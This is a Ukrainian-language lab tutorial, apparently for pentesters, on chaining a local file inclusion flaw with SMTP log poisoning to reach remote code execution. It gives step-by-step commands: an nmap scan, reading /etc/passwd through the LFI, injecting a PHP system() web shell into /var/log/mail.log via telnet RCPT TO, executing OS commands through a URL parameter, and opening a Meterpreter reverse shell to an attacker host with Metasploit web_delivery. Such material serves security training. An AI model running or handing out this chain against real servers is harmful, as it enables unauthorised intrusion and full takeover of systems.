

# **SMTP LOG POISONING ЧЕРЕЗ LOCAL FILE INCLUSION (LFI) ДО REMOTE CODE EXECUTION (RCE)**

Цей технічний звіт являє собою детальний посібник (README) з експлуатації складеного вектора атаки, відомого як **SMTP Log Poisoning**, який використовує уразливість **Local File Inclusion (LFI)** для досягнення **Remote Code Execution (RCE)**. Документ призначений для фахівців з кібербезпеки та пентестерів, які проводять аудит систем, де веб\-додатки та системні сервіси (зокрема, SMTP) недостатньо ізольовані.

---

## **1\. ВСТУП ТА АРХІТЕКТУРА АТАКИ**

Атака Log Poisoning є класичною технікою ін'єкції, що використовує неправильну конфігурацію системи журналювання у поєднанні з функціоналом включення локальних файлів. Це потужний вектор, оскільки він дозволяє зловмиснику перетворити відносно безпечний файл журналу (log file) на виконуваний скрипт, обходячи при цьому багато стандартних заходів безпеки веб\-додатків.

### **1.1. Що Таке Log Poisoning?**

Log Poisoning — це процес, під час якого атакуючий впроваджує шкідливий код, як правило, у формі PHP-пейлоаду, у файл журналу сервера. Файли журналу вважаються безпечними, оскільки вони, за задумом, містять лише незмінні текстові дані про діяльність системи. Однак, якщо веб\-сервер уразливий до Local File Inclusion (LFI), зловмисник може змусити веб\-додаток обробити цей текстовий лог-файл як динамічний скрипт. У результаті, ін’єктований код виконується в контексті веб\-сервера, що часто призводить до RCE.

### **1.2. Синтез Атаки: Взаємодія LFI та SMTP-Журналування**

У даному сценарії успіх RCE залежить від каскадного збою безпеки, який об'єднує уразливість веб\-додатка з неправильною конфігурацією системного сервісу (SMTP). Цей ланцюжок атаки виникає внаслідок збігу трьох критичних факторів:

1. **LFI Уразливість:** Існування на веб\-сервері скрипта, який дозволяє динамічно включати локальні файли без належної перевірки вводу.  
2. **Доступність Лог-Файлу:** Веб-сервер повинен мати права на читання лог-файлу поштового сервера, зазвичай це /var/log/mail.log.  
3. **Ін'єкція Коду:** Поштовий сервіс (SMTP) повинен логувати несанітизований ввід від клієнта (наприклад, у полі RCPT TO), дозволяючи запис шкідливого PHP-коду у лог-файл.

Аналіз цієї архітектури атаки демонструє фундаментальне порушення Принципу Багаторівневого Захисту (*Principle of Defense in Depth*). Досягнення RCE вимагає одночасного провалу трьох незалежних механізмів безпеки: безпеки коду (LFI), безпеки операційної системи (дозволи файлів) та безпеки мережевого сервісу (несанітизоване журналювання). Такий збіг уразливостей свідчить про низький рівень зрілості безпеки цільової системи, де процеси та дозволи різних служб не були належним чином ізольовані, що є передумовою для ефективної стратегії захисту на всіх рівнях.

## **2\. НЕОБХІДНІ УМОВИ (PREREQUISITES) ТА НАЛАШТУВАННЯ СЕРЕДОВИЩА**

Для успішного відтворення цього вектора атаки необхідно забезпечити наявність специфічних умов на цільовій системі та підготувати відповідний набір інструментів.

### **2.1. Вимоги до Інструментів та Знань**

Для проведення експлуатації необхідне попереднє розуміння налаштування **SMTP Lab** та основ **Local File Inclusion (LFI)** атак.1 Використовуються наступні інструменти:

* **Nmap:** Необхідний для сканування цільової машини та підтвердження, що порт 25 (стандартний порт SMTP) є відкритим та активним.  
* **Telnet (або Netcat):** Використовується для встановлення ручного зв'язку з SMTP-сервісом на порту 25\. Це дозволяє атакуючому імітувати відправку електронної пошти та впроваджувати шкідливі дані безпосередньо у протокол.1  
* **Metasploit Framework:** Застосовується на завершальному етапі для генерації та обслуговування складного пейлоаду зворотньої оболонки (*Reverse Shell*). Зокрема, використовується модуль exploit/multi/script/web\_delivery.1

### **2.2. Залежності Уразливості**

Атака є повністю залежною від наступного жорсткого набору умов на цільовій інфраструктурі:

1. **Активна LFI Уразливість:** Веб-додаток повинен мати вразливий скрипт (наприклад, lfi.php), який приймає зовнішній параметр для включення файлів без належної фільтрації.  
2. **Активний SMTP-Сервіс:** На цільовій машині має бути запущений та доступний поштовий сервер (наприклад, Postfix або Sendmail), який слухає на порту 25\.  
3. **Дозволи Файлів (Критична Залежність):** Користувач, під яким працює веб\-сервер (наприклад, www-data або apache), повинен мати права на читання системного лог-файлу пошти, типово /var/log/mail.log.1

Успішна експлуатація демонструє вразливість, яка ефективно перетворює протокол мережевого рівня (SMTP) на канал інжекції даних, що потім використовуються для компрометації рівня веб\-додатку (LFI). Цей ланцюжок підтверджує, що неправильна конфігурація служб, які не є прямими компонентами веб\-стеку, може становити пряму та несподівану загрозу для веб\-додатків. Відсутність ізоляції процесів та недостатній контроль доступу до системних лог-файлів є ключовими системними прорахунками, що дозволяють реалізувати цей вектор RCE.

## **3\. ДЕТАЛЬНЕ ПОЯСНЕННЯ МЕХАНІЗМУ АТАКИ**

Розуміння точного механізму, як SMTP логує дані та як PHP-інтерпретатор обробляє ці логи, є фундаментальним для експертного аналізу.

### **3.1. Доступність Файлу Журналу Пошти (*/var/log/mail.log*)**

Файл /var/log/mail.log є стандартним розташуванням для журналів, що генеруються поштовими агентами. Ці логи містять записи про кожну спробу з'єднання, транзакції, помилки відправки та інші діагностичні дані.1

Критичним фактором є те, що уразлива LFI-система дозволяє зловмиснику примусити веб\-сервер відобразити вміст цього лог-файлу, що можливо лише тоді, коли користувач веб\-сервера має необхідні права доступу на читання. Якби лог-файл був належним чином захищений та доступний лише системним користувачам, атака на цьому етапі була б неможливою.

### **3.2. Механізм Логування та Ін'єкція PHP**

Протокол SMTP вимагає від клієнта послідовності команд для відправки пошти. Коли зловмисник підключається до SMTP-порту 25 за допомогою telnet, він може послідовно вводити команди. Для Log Poisoning використовується команда RCPT TO:, яка визначає отримувача.

Атакуючий вводить пейлоад \<?php system($\_GET\['c'\]);?\> замість коректної адреси електронної пошти:
```
RCPT TO:<?php system($_GET['c']); ?>
```
Сервер, виявивши некоректний синтаксис адреси, відхиляє команду з помилкою (наприклад, 501 5.1.3 Bad recipient address syntax).1 Однак, більшість поштових серверів реєструють повний рядок вводу клієнта для цілей діагностики та траблшутінгу, навіть якщо ця команда призвела до помилки. Таким чином, рядок, що містить PHP-код, незважаючи на відмову у виконанні, записується у

/var/log/mail.log. Зловмисник не переймається успішністю відправки пошти; єдина мета — змусити діагностичний механізм записати шкідливий пейлоад.

### **3.3. Виконання Коду Через LFI**

Після того, як лог-файл "отруєний", зловмисник використовує уразливість LFI, щоб примусити PHP-інтерпретатор виконати вміст цього файлу.

URL-запит набуває вигляду: .../lfi.php?file=/var/log/mail.log. Коли веб\-сервер обробляє цей запит, він включає вміст лог-файлу. Інтерпретатор PHP, читаючи лог, ігнорує всі текстові записи SMTP (дати, статуси, IP-адреси), доки не зустріне дійсний відкриваючий тег PHP (\<?php). Шкідливий код system($\_GET\['c'\]); виконується, дозволяючи зловмиснику передавати команди операційної системи через додатковий параметр URL c.

При конструюванні пейлоаду критично важливо використовувати повний тег \<?php...?\>. Використання скорочених тегів (\<?...?\>) може бути заблоковано конфігурацією сервера (short\_open\_tag=Off у файлі php.ini). Використання повного тегу, як це продемонстровано в техніці 1, забезпечує максимальну сумісність і надійність виконання пейлоаду на більшості конфігурацій PHP.

## **4\. ПОКРОКОВА ІНСТРУКЦІЯ З ЕКСПЛУАТАЦІЇ**

Наступні кроки детально описують послідовність дій для реалізації SMTP Log Poisoning, використовуючи команди, наведені у вихідному матеріалі.

### **4.1. Етап I: Розвідка та Перевірка Сервісів**

Перший крок полягає у підтвердженні доступності SMTP-сервісу на цільовій машині.

* **Дія:** Сканування порту 25\.  
* **Інструмент:** Nmap.  
* **Команда (Приклад):**  
```Bash  
  nmap -p25 192.168.1.107
```

* **Очікуваний Результат:** Порт 25 повинен бути у стані open (відкритий).

### **4.2. Етап II: Верифікація Уразливості LFI**

Необхідно підтвердити, що веб\-сервер має уразливість Local File Inclusion.

* **Дія:** Спроба включити стандартний системний файл Linux, який зазвичай доступний.  
* **URL (Приклад):**  
```
192.168.1.107/lfi/lfi.php?file=/etc/passwd
```
* **Очікуваний Результат:** Успішне відображення вмісту файлу /etc/passwd у браузері підтверджує наявність LFI-уразливості.1

### **4.3. Етап III: Підтвердження Доступу до Лог-Файлу**

Перед інжекцією коду необхідно переконатися, що веб\-сервер може читати цільовий лог-файл.

* **Дія:** Спроба включити системний лог-файл пошти.  
* **URL (Приклад):**  
```
192.168.1.107/lfi/lfi.php?file=/var/log/mail.log
```
* **Очікуваний Результат:** Відображення вмісту лог-файлу (навіть якщо він порожній або містить лише стандартні записи). Цей крок підтверджує критичну проблему з дозволами файлів.

### **4.4. Етап IV: Отруєння Лог-Файлу (Log Poisoning) Через Telnet**

Це етап інжекції PHP-коду у лог-файл.

* **1\. Підключення до SMTP-сервісу:**  
```Bash  
  telnet 192.168.1.107 25
```

* **2\. Ін'єкція Коду:** Після привітання SMTP-сервера необхідно ввести послідовність команд, використовуючи поле RCPT TO: для розміщення шкідливого пейлоаду. Використовується PHP-код, що дозволяє виконання команд ОС через URL-параметр c.1

**Послідовність Інжекції SMTP та Очікуваний Результат**

| Команда SMTP (Telnet) | Призначення | Очікувана Реакція Сервера | Результат у Лог-Файлі |
| :---- | :---- | :---- | :---- |
| telnet \[IP\] 25 | Встановлення з'єднання | Вітання сервера (220) | Запис про нове з'єднання |
| MAIL FROM:\<rrajchandel@gmail.com\> | Визначення відправника | Підтвердження (250) | Запис про відправника |
| RCPT TO:\<?php system($\_GET\['c'\]);?\> | **Ін'єкція шкідливого коду** | Помилка синтаксису (501) | Запис *інжектованого рядка* |
| QUIT | Завершення сесії | Закриття з'єднання (221) | Запис про закриття сесії |

Специфіка цієї техніки полягає в тому, що успіх залежить від логування, а не від коректного виконання транзакції. Відповідь 501 підтверджує, що синтаксис був невірним, але саме це відхилення змушує SMTP-сервіс детально залогувати повний рядок клієнтського вводу, що і є метою Log Poisoning.1

## **5\. РЕАЛІЗАЦІЯ ВІДДАЛЕНОГО ВИКОНАННЯ КОДУ (RCE)**

Після успішного отруєння лог-файлу, RCE реалізується шляхом повторного звернення до LFI-уразливості з додатковим параметром, що містить команди для виконання.

### **5.1. Виконання Команди ОС для Перевірки**

Для підтвердження працездатності RCE виконується проста команда ОС через параметр c.

* **Дія:** Виконання команди ifconfig.  
* **URL (Приклад):**  
```
192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&c=ifconfig
```
* **Очікуваний Результат:** Веб-сторінка відображатиме вивід команди ifconfig. Це підтверджує, що PHP-код system($\_GET\['c'\]); був успішно виконаний, а RCE досягнуто.

### **5.2. Генерація Зворотньої Оболонки (Reverse Shell)**

Для отримання постійного, інтерактивного доступу до скомпрометованої системи використовується Metasploit Framework.

* **Модуль та Пейлоад:** Використовується модуль exploit/multi/script/web\_delivery з пейлоадом php/meterpreter/reverse\_tcp.1 Цей модуль зручний, оскільки він генерує короткий, часто base64-закодований, скрипт, який ідеально підходить для передачі через URL-параметр.  
* Команди Metasploit (Приклад):  
  Необхідно налаштувати локальну адресу (LHOST) та порт (LPORT) для отримання зворотного з'єднання:  
```Bash  
  use exploit/multi/script/web_delivery  
  set target 1  
  set payload php/meterpreter/reverse_tcp  
  set lhost 192.168.1.109  
  set lport 8888  
  exploit
```

### **5.3. Фінальна Експлуатація та Отримання Сесії Meterpreter**

Після генерації Metasploit-пейлоаду, цей код використовується як значення для параметра c у LFI-запиті.

* **Дія:** Включення отруєного логу з Meterpreter-пейлоадом.  
* \*\*URL (Приклад):  
```  
192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&c=<PASTED_MALICIOUS_CODE>
```
* **Очікуваний Результат:** Metasploit-консоль отримує вхідне з'єднання, і зловмисник отримує сесію meterpreter на цільовій машині.1

**Зведення Кроків Експлуатації та Команд**

| Етап Атаки | Команда / URL-Запит | Призначення | Джерело |
| :---- | :---- | :---- | :---- |
| 1\. Розвідка SMTP | nmap \-p25 192.168.1.107 | Перевірка доступності SMTP | 1 |
| 2\. Перевірка LFI | http://target/lfi.php?file=/etc/passwd | Верифікація уразливості включення файлів | 
| 3\. Ін'єкція PHP | telnet 192.168.1.107 25 / RCPT TO:\<?php system($\_GET\['c'\]);?\> | Отруєння лог-файлу |
| 4\. Тест RCE | http://target/lfi.php?file=/var/log/mail.log\&c=ifconfig | Виконання тестової команди ОС |
| 5\. Reverse Shell | Metasploit web\_delivery / ...\&c=\<payload\> | Отримання інтерактивної оболонки (Meterpreter) |

Можна обійтись також і звичайним nc через php reverse

#### **Джерела**

1. SMTP Log Poisoning through LFI to Remote Code Execution ..., доступ отримано жовтня 4, 2025, [https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)
